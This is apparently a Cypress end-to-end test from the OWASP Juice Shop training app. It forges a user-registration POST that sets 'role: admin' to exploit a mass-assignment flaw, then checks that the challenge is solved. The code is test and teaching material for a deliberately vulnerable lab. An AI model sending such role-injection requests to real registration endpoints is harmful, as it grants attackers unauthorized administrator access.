export function registerAdminChallenge() {
 
  // Forge POST request to create an admin user
  const options = {
    method: 'POST',
    url: '/api/Users/',
    body: {
      email: 'pwned@juiceshop.com',
      password: 'pwned',
      passwordRepeat: 'pwned',
      role : 'admin',
      securityQuestion: {
        id: 5,
        question: 'Maternal grandmother\'s first name?',
        createdAt: '2020-06-11T21:38:56.400Z',
        updatedAt: '2020-06-11T21:38:56.400Z'
      },
      securityAnswer:"pwned"
    }
  };

  cy.request(options).then(() => {
    cy.isSolvedChallenge('registerAdminChallenge').should('eq', true);
  });  
    
}
